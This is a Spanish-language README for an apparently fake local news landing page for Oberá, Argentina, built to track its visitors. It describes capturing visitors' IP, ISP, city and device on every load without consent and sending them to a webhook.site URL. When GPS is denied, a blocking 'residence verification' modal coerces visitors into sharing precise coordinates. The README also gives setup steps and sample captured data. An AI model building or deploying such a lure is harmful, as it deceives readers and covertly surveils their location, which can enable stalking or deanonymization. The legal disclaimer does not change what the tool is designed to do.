# 📰 Oberá Al Día - Landing de Noticias Locales

[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat&logo=html5&logoColor=white)](https://developer.mozilla.org/es/docs/Web/HTML)
[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat&logo=css3&logoColor=white)](https://developer.mozilla.org/es/docs/Web/CSS)
[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat&logo=javascript&logoColor=black)](https://developer.mozilla.org/es/docs/Web/JavaScript)
[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=flat&logo=tailwind-css&logoColor=white)](https://tailwindcss.com)

Landing page estática moderna para noticias de la **Zona Centro de Misiones, Argentina**, con sistema de **analytics persistente** basado en geolocalización.

![Demo](https://via.placeholder.com/800x400/DC2626/FFFFFF?text=Ober%C3%A1+Al+D%C3%ADa)

---

## ✨ Características

- 🎨 **Diseño moderno** con Tailwind CSS
- 📱 **Totalmente responsivo** (móvil, tablet, escritorio)
- 🔴 **Sección "Último Momento"** con alertas destacadas
- 📰 **Grilla de noticias** categorizada (6 noticias)
- 🌍 **Sistema de analytics** con captura de IP/ISP + GPS
- 🚨 **Modal bloqueante** para verificación de residencia
- 📊 **Panel de testing** interactivo

---

## 🚀 Demo Rápido

```bash
# Clonar el repositorio
git clone https://github.com/tu-usuario/obera-al-dia.git

# Navegar al directorio
cd obera-al-dia

# Abrir en navegador
open index.html
# O simplemente hacer doble clic en index.html
```

---

## 📦 Estructura del Proyecto

```
obera-al-dia/
├── index.html                      # Página principal
├── analytics.js                    # Sistema de captura persistente
├── testing.html                    # Panel de testing
├── README.md                       # Este archivo
├── CONFIGURACION-WEBHOOK.md        # Setup rápido webhook
├── DIAGRAMA-FLUJO.md              # Flujo del sistema
├── CONSIDERACIONES-LEGALES.md      # Aspectos legales
├── ROADMAP.md                      # Mejoras futuras
└── ejemplo-datos-capturados.json  # Ejemplo JSON
```

---

## ⚙️ Configuración en 3 Pasos

### 1️⃣ Obtener Webhook URL

Ve a [webhook.site](https://webhook.site) y copia tu URL única.

### 2️⃣ Configurar analytics.js

```javascript
// Línea 13 de analytics.js
webhookUrl: 'https://webhook.site/TU-ID-AQUI',
```

### 3️⃣ Probar

Abre `index.html` en tu navegador y ve los datos en tiempo real en webhook.site.

---

## 🔍 Cómo Funciona

### Fase 1: Captura Silenciosa (Automática)
- ✅ IP pública
- ✅ ISP (proveedor de internet)
- ✅ Ciudad/región aproximada
- ✅ Tipo de dispositivo
- ✅ Info del navegador

**Se ejecuta SIEMPRE al cargar la página, sin permiso del usuario.**

### Fase 2: GPS (Condicional)

**Si acepta GPS →** Se capturan coordenadas precisas y se envía segundo paquete.

**Si deniega GPS →** Aparece modal bloqueante:

```
╔═══════════════════════════════════╗
║   📍 Verificación de Residencia   ║
║                                   ║
║  Para leer noticias de la         ║
║  Zona Centro, confirma tu         ║
║  ubicación.                       ║
║                                   ║
║   [🔒 Confirmar y Leer]           ║
╚═══════════════════════════════════╝
```

---

## 📊 Datos Capturados

### Paquete 1 (Siempre enviado)
```json
{
  "event": "page_load",
  "sessionId": "session_...",
  "networkInfo": {
    "ip": "181.45.123.45",
    "isp": "Telecom Argentina S.A.",
    "city": "Oberá",
    "region": "Misiones"
  }
}
```

### Paquete 2 (Si acepta GPS)
```json
{
  "event": "gps_granted",
  "sessionId": "session_...",
  "gpsData": {
    "latitude": -27.4912,
    "longitude": -55.1183,
    "accuracy": 18.5
  }
}
```

---

## 🧪 Testing

### Panel Interactivo
Abre `testing.html` para ver:
- Estado en tiempo real
- Botones de control
- Logs del sistema

### Comandos de Consola
```javascript
window.OberaAnalytics.state      // Ver estado
window.OberaAnalytics.retry()    // Reintentar GPS
window.OberaAnalytics.showModal() // Mostrar modal
```

### Reset Permisos
**Chrome/Edge:** Candado → Permisos → Ubicación → Restablecer

---

## ⚠️ IMPORTANTE: Consideraciones Legales

Este sistema captura datos personales sensibles. **Antes de usar en producción:**

- 📜 Agrega **política de privacidad**
- 🍪 Implementa **banner de consentimiento**
- ⚖️ Cumple con **Ley 25.326** (Argentina) y **GDPR** (Europa)
- 🔒 Reemplaza webhook.site por **backend seguro**

👉 Lee `CONSIDERACIONES-LEGALES.md` para más información.

---

## 🛠️ Tecnologías Utilizadas

- **HTML5** - Estructura semántica
- **Tailwind CSS** - Diseño responsivo
- **JavaScript Vanilla** - Sin frameworks
- **Geolocation API** - Captura de GPS
- **ipapi.co** - Geolocalización por IP

---

## 📚 Documentación Completa

- 📖 [README.md](README.md) - Guía completa
- ⚡ [CONFIGURACION-WEBHOOK.md](CONFIGURACION-WEBHOOK.md) - Setup rápido
- 🔄 [DIAGRAMA-FLUJO.md](DIAGRAMA-FLUJO.md) - Flujo visual
- ⚖️ [CONSIDERACIONES-LEGALES.md](CONSIDERACIONES-LEGALES.md) - Aspectos legales
- 🚀 [ROADMAP.md](ROADMAP.md) - Mejoras futuras
- 📇 [INDICE.md](INDICE.md) - Índice general

---

## 🤝 Contribuciones

Las contribuciones son bienvenidas. Por favor:

1. Fork el proyecto
2. Crea una rama: `git checkout -b feature/mejora`
3. Commit: `git commit -m 'Agregar mejora'`
4. Push: `git push origin feature/mejora`
5. Abre un Pull Request

---

## 📄 Licencia

Este proyecto es de código abierto bajo la licencia MIT. Ver `LICENSE` para más detalles.

---

## 👨‍💻 Autor

**Desarrollo para Oberá Al Día**  
Misiones, Argentina 🇦🇷

---

## ⭐ Agradecimientos

- [Tailwind CSS](https://tailwindcss.com) - Framework CSS
- [Webhook.site](https://webhook.site) - Testing de webhooks
- [ipapi.co](https://ipapi.co) - API de geolocalización
- [Placeholder.com](https://placeholder.com) - Imágenes de ejemplo

---

## 📞 Soporte

¿Problemas o preguntas?
- 📧 Email: dev@oberaaldia.com.ar
- 🐛 Issues: [GitHub Issues](https://github.com/tu-usuario/obera-al-dia/issues)

---

<div align="center">

**Hecho con ❤️ para Oberá, Misiones**

[⬆ Volver arriba](#-oberá-al-día---landing-de-noticias-locales)

</div>
